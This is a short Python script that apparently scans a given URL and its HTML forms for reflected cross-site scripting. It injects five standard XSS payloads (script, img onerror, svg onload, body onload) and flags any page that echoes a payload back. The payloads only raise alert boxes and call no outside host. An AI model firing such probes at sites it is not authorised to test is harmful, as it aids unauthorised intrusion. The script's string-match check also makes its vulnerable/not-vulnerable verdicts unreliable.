import requests
from bs4 import BeautifulSoup

def xss_vulner(response, payload):
    return payload in response.text

def test_xss(url, payloads):
    vulnerable = False
    for payload in payloads:
        test_url = url + payload
        response = requests.get(test_url)
        if xss_vulner(response, payload):
            vulnerable = True
            print(f"Vulnerable payload found: {payload}")
            break
    return vulnerable

def find_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def submit_form(form, url, payload):
    action = form.attrs.get('action')
    method = form.attrs.get('method', 'get').lower()
    form_url = url + action if action else url
    inputs = form.find_all('input')
    data = {input.attrs.get('name'): payload for input in inputs if input.attrs.get('name')}

    if method == 'post':
        return requests.post(form_url, data=data)
    else:
        return requests.get(form_url, params=data)

def test_xss_forms(url, payloads):
    forms = find_forms(url)
    vulnerable = False
    for form in forms:
        for payload in payloads:
            response = submit_form(form, url, payload)
            if xss_vulner(response, payload):
                vulnerable = True
                print(f"Vulnerable form found with payload: {payload}")
                break
    return vulnerable

def xss_tester(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<body onload=alert('XSS')>"
    ]
    
    print(f"Testing URL for XSS: {url}")
    if test_xss(url, payloads):
        print(f"URL {url} is vulnerable to XSS.")
    else:
        print(f"URL {url} is not vulnerable to XSS.")
    
    print(f"Testing forms on URL for XSS: {url}")
    if test_xss_forms(url, payloads):
        print(f"Forms on {url} are vulnerable to XSS.")
    else:
        print(f"Forms on {url} are not vulnerable to XSS.")

if __name__ == "__main__":
    target_url = "http://"
    xss_tester(target_url)
